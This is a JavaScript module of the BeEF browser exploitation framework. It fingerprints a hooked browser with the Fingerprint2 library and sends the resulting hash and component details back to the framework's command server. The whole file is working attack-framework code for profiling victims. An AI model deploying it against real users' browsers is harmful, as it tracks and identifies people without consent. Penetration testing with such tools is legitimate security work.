//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  <%=
    begin
      f = "#{$root_dir}/modules/browser/fingerprint_browser/fingerprint2.js"
      File.read(f)
    rescue => e
      print_error "[Fingerprint Browser] Could not read file '#{f}': #{e}"
    end
  %>

  try {
    new Fingerprint2().get(function(result, components){
      beef.debug('[Fingerprint Browser] Result: ' + result);
      beef.debug('[Fingerprint Browser] Components: ' + JSON.stringify(components));
      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fingerprint=' + result + '&components=' + JSON.stringify(components), beef.are.status_success());
    });
  } catch(e) {
    beef.debug('[Fingerprint Browser] Error: ' + e.message);
    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=' + e.message, beef.are.status_error());
  }
});

